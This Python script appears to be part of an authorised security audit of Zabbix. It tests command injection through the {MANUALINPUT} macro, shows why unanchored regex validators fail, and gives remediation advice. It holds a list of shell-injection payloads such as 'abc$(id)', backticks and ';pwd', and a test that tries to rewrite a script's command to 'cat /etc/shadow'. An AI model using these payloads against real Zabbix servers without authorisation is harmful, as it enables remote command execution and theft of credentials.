#!/usr/bin/env python3
"""
Security Research II -- Phase 4: Script Execution & MANUALINPUT Injection Testing
Tests the {MANUALINPUT} macro substitution and script execution paths.

From source audit:
  - substitute_macro() in nodecommand.c does raw string replacement (no shell escaping)
  - validate_manualinput() uses zbx_regexp_match_full() which does PCRE partial matching
  - An unanchored regex like [a-zA-Z0-9]+ passes "abc$(whoami)" because "abc" matches
  - Scripts are executed via execl("/bin/sh", "sh", "-c", command)

IMPORTANT constant mapping (verified from source):
  PHP:  ZBX_SCRIPT_MANUALINPUT_TYPE_STRING = 0 (regex), ZBX_SCRIPT_MANUALINPUT_TYPE_LIST = 1
  C:    ZBX_SCRIPT_MANUALINPUT_VALIDATOR_TYPE_REGEX = 0, ZBX_SCRIPT_MANUALINPUT_VALIDATOR_TYPE_LIST = 1
  So: manualinput_validator_type = 0 -> regex validation, 1 -> comma-separated list
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Zabbix/scripts')

from zabbix_common import *

banner("Phase 4: Script Execution & MANUALINPUT Injection")

ec = EvidenceCollector("phase4_script_injection", phase="phase4")

admin = ZabbixSession(ADMIN_USER, ADMIN_PASS)
viewer = ZabbixSession(VIEWER_USER, VIEWER_PASS)

if not admin.auth_token:
    print("  [-] Admin login failed")
    ec.save()
    sys.exit(1)

# ===========================================================================
# TEST 1: Create scripts with MANUALINPUT and various validators
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: MANUALINPUT Script Creation & Validation")
print("=" * 60)

hosts = admin.api_call("host.get", {"output": ["hostid", "host"], "filter": {"host": "Zabbix server"}})
host_id = hosts["result"][0]["hostid"] if "result" in hosts and hosts["result"] else "10084"
print(f"  Target host: {host_id}")

# manualinput_validator_type: 0 = STRING/REGEX, 1 = LIST (comma-separated)
test_scripts = [
    {
        "name": "SecTest-UnanchoredRegex",
        "command": "echo OUTPUT_{MANUALINPUT}_END",
        "scope": 2,  # Manual host action
        "type": 0,   # Script
        "execute_on": 1,  # Server
        "manualinput": 1,  # Enabled
        "manualinput_prompt": "Enter hostname:",
        "manualinput_validator_type": 0,  # STRING/REGEX
        "manualinput_validator": "[a-zA-Z0-9]+",  # NOT anchored
        "manualinput_default_value": "",
        "desc": "Unanchored regex [a-zA-Z0-9]+ (partial match)",
    },
    {
        "name": "SecTest-AnchoredRegex",
        "command": "echo OUTPUT_{MANUALINPUT}_END",
        "scope": 2,
        "type": 0,
        "execute_on": 1,
        "manualinput": 1,
        "manualinput_prompt": "Enter hostname:",
        "manualinput_validator_type": 0,  # STRING/REGEX
        "manualinput_validator": "^[a-zA-Z0-9]+$",  # Properly anchored
        "manualinput_default_value": "",
        "desc": "Anchored regex ^[a-zA-Z0-9]+$ (full match)",
    },
    {
        "name": "SecTest-DropdownList",
        "command": "echo OUTPUT_{MANUALINPUT}_END",
        "scope": 2,
        "type": 0,
        "execute_on": 1,
        "manualinput": 1,
        "manualinput_prompt": "Select option:",
        "manualinput_validator_type": 1,  # LIST (comma-separated)
        "manualinput_validator": "safe1,safe2,safe3",
        "manualinput_default_value": "safe1",
        "desc": "Dropdown list [safe1,safe2,safe3]",
    },
]

created_script_ids = []

for script_def in test_scripts:
    params = {
        "name": script_def["name"],
        "command": script_def["command"],
        "scope": script_def["scope"],
        "type": script_def["type"],
        "execute_on": script_def["execute_on"],
        "manualinput": script_def["manualinput"],
        "manualinput_prompt": script_def["manualinput_prompt"],
        "manualinput_validator_type": script_def["manualinput_validator_type"],
        "manualinput_validator": script_def["manualinput_validator"],
        "manualinput_default_value": script_def["manualinput_default_value"],
        "groupid": 0,
    }

    result = admin.api_call("script.create", params)
    if "result" in result:
        sid = result["result"]["scriptids"][0]
        created_script_ids.append(sid)
        print(f"\n  Created: {script_def['name']} (ID: {sid})")
        print(f"    Desc: {script_def['desc']}")
    else:
        print(f"\n  Failed: {script_def['name']}: {result.get('error', {}).get('data', '')[:80]}")
        created_script_ids.append(None)

    ec.add_test(
        f"SCRIPT-CREATE-{script_def['name'][:25]}",
        f"Create script: {script_def['desc'][:50]}",
        f"script.create({script_def['name']})",
        f"{'OK (ID:' + str(created_script_ids[-1]) + ')' if 'result' in result else 'FAILED: ' + result.get('error', {}).get('data', '')[:60]}",
        result="PASS" if "result" in result else "FAIL",
    )
    rate_limit(0.2)

# ===========================================================================
# TEST 2: Execute scripts with injection payloads
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: Script Execution with Injection Payloads")
print("=" * 60)

# Safe RCE validation: use 'pwd' and 'id' per standing rules
injection_payloads = [
    ("test123", "Baseline (clean value)"),
    ("abc$(pwd)", "Command substitution $(pwd)"),
    ("abc$(id)", "Command substitution $(id)"),
    ("abc`pwd`", "Backtick command substitution"),
    ("abc${PATH}", "Variable expansion ${PATH}"),
    ("test;pwd", "Semicolon separator"),
    ("test|pwd", "Pipe operator"),
    ("test&&pwd", "Double ampersand"),
    ("test||pwd", "Double pipe (OR)"),
    ("test\npwd", "Newline injection"),
    ("test'pwd'", "Single quote break"),
    ('test"pwd"', "Double quote break"),
]

for idx, (script_info, script_id) in enumerate(zip(test_scripts, created_script_ids)):
    if script_id is None:
        continue

    print(f"\n  Script: {script_info['name']} ({script_info['desc']})")
    print(f"  {'='*55}")

    for payload, payload_desc in injection_payloads:
        result = admin.api_call("script.execute", {
            "scriptid": script_id,
            "hostid": host_id,
            "manualinput": payload,
        })

        if "error" in result:
            error = result["error"]
            error_msg = error.get("data", error.get("message", ""))
            print(f"    REJECT | {payload_desc:35s} | {repr(payload)[:30]}")
            ec.add_test(
                f"INJECT-{script_id}-{payload_desc[:20].replace(' ', '_')}",
                f"Injection: {payload_desc} on {script_info['name'][:25]}",
                f"script.execute manualinput={repr(payload)[:40]}",
                f"REJECTED: {error_msg[:80]}",
                result="PASS",
            )
        elif "result" in result:
            output = result["result"].get("value", "")

            # Check if injection succeeded
            # Normal output pattern: OUTPUT_<input>_END
            # Injection indicators: paths, uid info, env vars appearing in output
            injection_success = False
            injection_indicators = ["/var/", "/home/", "/usr/", "/root/", "/bin/",
                                     "/sbin/", "uid=", "gid="]
            if payload != "test123":
                for indicator in injection_indicators:
                    if indicator in output:
                        injection_success = True
                        break

            status = "VULN" if injection_success else "PASS"
            marker = "[!!] INJECTION" if injection_success else "    OUTPUT "

            print(f"    {marker} | {payload_desc:35s} | {output[:70]}")

            if injection_success:
                ec.add_finding(
                    f"MANUALINPUT-INJECT-{script_id}-{payload_desc[:15]}",
                    "HIGH",
                    f"Command injection via MANUALINPUT: {payload_desc}",
                    f"Script: {script_info['name']}\n"
                    f"Validator: {script_info['manualinput_validator']} (type={script_info['manualinput_validator_type']})\n"
                    f"Payload: {repr(payload)}\n"
                    f"Output: {output[:400]}\n\n"
                    f"Root cause: substitute_macro() in nodecommand.c performs raw string "
                    f"replacement of {{MANUALINPUT}} into shell commands without any escaping. "
                    f"The regex validation uses zbx_regexp_match_full() which performs PCRE "
                    f"partial matching (not anchored), so an unanchored regex like [a-zA-Z0-9]+ "
                    f"passes 'abc$(pwd)' because 'abc' satisfies the partial match. "
                    f"The command is then executed via execl('/bin/sh', 'sh', '-c', command).",
                    evidence=json.dumps(result["result"], indent=2)[:800],
                    remediation=(
                        "1. Shell-escape the MANUALINPUT value before substitution into commands "
                        "(e.g., replace single quotes and wrap in single quotes).\n"
                        "2. Enforce anchored regex matching: automatically wrap validator regex "
                        "in ^...$ if not already anchored, or use pcre2_match with PCRE2_ANCHORED.\n"
                        "3. Use argument-based execution instead of shell string interpolation: "
                        "pass MANUALINPUT as an environment variable rather than substituting "
                        "into the command string.\n"
                        "4. Add a character allowlist/blocklist for MANUALINPUT values to reject "
                        "shell metacharacters ($, `, \\, etc.)."
                    ),
                )

            ec.add_test(
                f"INJECT-{script_id}-{payload_desc[:20].replace(' ', '_')}",
                f"Injection: {payload_desc} on {script_info['name'][:25]}",
                f"script.execute manualinput={repr(payload)[:40]}",
                f"Output: {output[:100]}",
                result=status,
            )
        rate_limit(0.3)

# ===========================================================================
# TEST 3: Viewer attempting script execution
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: Viewer Script Execution (Authorization Check)")
print("=" * 60)

if viewer.auth_token:
    v_scripts = viewer.api_call("script.get", {"output": "extend"})
    if "result" in v_scripts:
        visible = [s for s in v_scripts["result"] if s["name"].startswith("SecTest")]
        print(f"\n  Viewer can see {len(visible)} test scripts")
        for s in visible:
            print(f"    [{s['scriptid']}] {s['name']}")

        for s in visible[:1]:
            # Try clean execution
            print(f"\n  Viewer executing: {s['name']} with clean input")
            result = viewer.api_call("script.execute", {
                "scriptid": s["scriptid"],
                "hostid": host_id,
                "manualinput": "test123",
            })
            if "error" in result:
                print(f"    Denied: {result['error'].get('data', '')[:80]}")
            elif "result" in result:
                print(f"    [!!] EXECUTED: {result['result'].get('value', '')[:80]}")

            # Try injection payload
            print(f"  Viewer executing: {s['name']} with injection payload")
            result2 = viewer.api_call("script.execute", {
                "scriptid": s["scriptid"],
                "hostid": host_id,
                "manualinput": "abc$(id)",
            })
            if "error" in result2:
                print(f"    Denied: {result2['error'].get('data', '')[:80]}")
            elif "result" in result2:
                output = result2["result"].get("value", "")
                print(f"    [!!] INJECTION AS VIEWER: {output[:80]}")

            ec.add_test(
                "VIEWER-SCRIPT-EXEC",
                f"Viewer executes script with injection",
                f"script.execute as viewer with manualinput='abc$(id)'",
                f"{'Denied' if 'error' in result else 'EXECUTED: ' + result.get('result', {}).get('value', '')[:60]}",
                result="VULN" if "result" in result2 and "uid=" in result2.get("result", {}).get("value", "") else "PASS",
            )
    else:
        print("  Viewer cannot list scripts")
else:
    print("  Viewer login failed, skipping")

# ===========================================================================
# TEST 4: Script modification by non-admin
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Script Modification by Viewer")
print("=" * 60)

if viewer.auth_token and created_script_ids[0]:
    result = viewer.api_call("script.update", {
        "scriptid": created_script_ids[0],
        "command": "cat /etc/shadow",
    })
    if "error" in result:
        print(f"  Viewer update script: Denied ({result['error'].get('data', '')[:80]})")
    else:
        print(f"  [!!] Viewer modified script!")

    result = viewer.api_call("script.create", {
        "name": "ViewerScript",
        "command": "id",
        "scope": 2,
        "type": 0,
        "execute_on": 1,
    })
    if "error" in result:
        print(f"  Viewer create script: Denied ({result['error'].get('data', '')[:80]})")
    else:
        print(f"  [!!] Viewer created script!")
        admin.api_call("script.delete", [result["result"]["scriptids"][0]])

    ec.add_test(
        "SCRIPT-MODIFY-VIEWER",
        "Viewer attempts to modify/create scripts",
        "script.update/create as viewer",
        "Denied" if "error" in result else "ALLOWED",
        result="PASS" if "error" in result else "VULN",
    )

# ===========================================================================
# TEST 5: Check for default/existing scripts with MANUALINPUT
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 5: Existing Scripts with MANUALINPUT")
print("=" * 60)

all_scripts = admin.api_call("script.get", {"output": "extend"})
if "result" in all_scripts:
    for s in all_scripts["result"]:
        if s.get("manualinput") == "1" and not s["name"].startswith("SecTest"):
            print(f"  [{s['scriptid']}] {s['name']}")
            print(f"    Command: {s['command'][:100]}")
            print(f"    Validator type: {s['manualinput_validator_type']}")
            print(f"    Validator: {s['manualinput_validator']}")
            anchored = s["manualinput_validator"].startswith("^") and s["manualinput_validator"].endswith("$")
            if not anchored and s["manualinput_validator_type"] == "0":
                print(f"    [!!] VULNERABLE: unanchored regex")
    mi_count = sum(1 for s in all_scripts["result"]
                   if s.get("manualinput") == "1" and not s["name"].startswith("SecTest"))
    print(f"\n  Total non-test scripts with MANUALINPUT: {mi_count}")

ec.add_test(
    "DEFAULT-MANUALINPUT-SCRIPTS",
    "Check for default scripts with MANUALINPUT enabled",
    "script.get output=extend filter manualinput=1",
    f"{mi_count if 'mi_count' in dir() else 0} scripts found",
    result="PASS",
)

# ===========================================================================
# CLEANUP
# ===========================================================================

print("\n" + "=" * 60)
print("  CLEANUP")
print("=" * 60)

for sid in created_script_ids:
    if sid:
        result = admin.api_call("script.delete", [sid])
        if "result" in result:
            print(f"  Deleted script {sid}")
        else:
            print(f"  Failed to delete {sid}: {result.get('error', {}).get('data', '')[:60]}")
        rate_limit(0.1)

# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 4 SUMMARY")
print("=" * 60)

viewer.logout()
admin.logout()

ec.save()
